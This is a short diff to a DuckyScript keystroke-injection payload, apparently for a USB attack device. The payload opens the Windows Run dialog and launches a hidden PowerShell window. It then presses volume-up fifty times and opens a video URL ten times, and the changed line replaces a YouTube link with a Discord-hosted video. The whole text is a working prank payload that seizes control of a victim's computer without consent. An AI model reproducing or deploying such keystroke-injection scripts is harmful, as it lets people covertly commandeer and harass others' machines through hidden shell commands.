@@ -5,5 +5,5 @@ REM ---------------- I Am Jakoby --
 DELAY 500
 GUI r
 DELAY 600
-STRING powershell -w h $k=[Math]::Ceiling(100/2);$o=New-Object -ComObject WScript.Shell;for($i=0;$i -lt $k;$i++){$o.SendKeys([char] 175)}; 1..10|foreach {saps https://www.youtube.com/watch?v=U3sAkAWfxLY;sleep 1;$o.SendKeys('f')}
+STRING powershell -w h $k=[Math]::Ceiling(100/2);$o=New-Object -ComObject WScript.Shell;for($i=0;$i -lt $k;$i++){$o.SendKeys([char] 175)}; 1..10|foreach {saps https://cdn.discordapp.com/attachments/1107104605751484520/1121704027206451270/trim.F05AFFEA-CEB8-4151-AFEE-A7C27C98A7EB.mov }
 ENTER
